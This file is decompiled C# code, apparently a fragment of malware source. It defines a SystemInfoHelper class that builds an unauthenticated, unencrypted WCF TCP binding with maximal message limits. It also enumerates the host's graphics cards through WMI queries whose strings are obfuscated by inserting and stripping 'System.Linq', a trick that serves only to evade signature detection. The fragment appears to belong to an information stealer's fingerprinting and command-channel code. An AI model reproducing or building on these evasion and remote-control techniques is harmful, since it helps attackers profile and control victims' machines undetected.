using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;

// Token: 0x02000024 RID: 36
public static class SystemInfoHelper
{
	// Token: 0x060000C6 RID: 198 RVA: 0x0000967C File Offset: 0x00007A7C
	public static System.ServiceModel.Channels.Binding CreateBind()
	{
		return new NetTcpBinding
		{
            // Was TimeSpan.FromMinutes(30.0)
            MaxReceivedMessageSize = 2147483647L,
			MaxBufferPoolSize = 2147483647L,
			CloseTimeout = TimeSpan.FromSeconds(120.0),
			OpenTimeout = TimeSpan.FromSeconds(120.0),
            ReceiveTimeout = TimeSpan.FromSeconds(120.0),
            SendTimeout = TimeSpan.FromSeconds(120.0),
            TransferMode = TransferMode.Buffered,
			ReaderQuotas = new XmlDictionaryReaderQuotas
			{
				MaxDepth = 44567654,
				MaxArrayLength = int.MaxValue,
				MaxBytesPerRead = int.MaxValue,
				MaxNameTableCharCount = int.MaxValue,
				MaxStringContentLength = int.MaxValue
			},
			Security = new NetTcpSecurity
			{
				Mode = SecurityMode.None,
				Message = new MessageSecurityOverTcp
				{
					ClientCredentialType = MessageCredentialType.None
				}
			}
		};
	}

	public static List<Entity_HardwareInfo> GetGraphicCards()
	{
		List<Entity_HardwareInfo> list = new List<Entity_HardwareInfo>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("roSystem.Linqot\\CISystem.LinqMV2".Replace("System.Linq", string.Empty), "SELSystem.LinqECT * FRSystem.LinqOM WinSystem.Linq32_VideoCoSystem.Linqntroller".Replace("System.Linq", string.Empty)))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							uint num = Convert.ToUInt32(managementObject["AdapterRAM"]);
							if (num > 0U)
							{
								list.Add(new Entity_HardwareInfo
								{
									name = (managementObject["Name"] as string),
									value = num.ToString(),
									Id3 = Entity_HardwareType.Id2
								});
							}
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}
		catch (Exception ex)
		{

		}
		return list;
	}
}
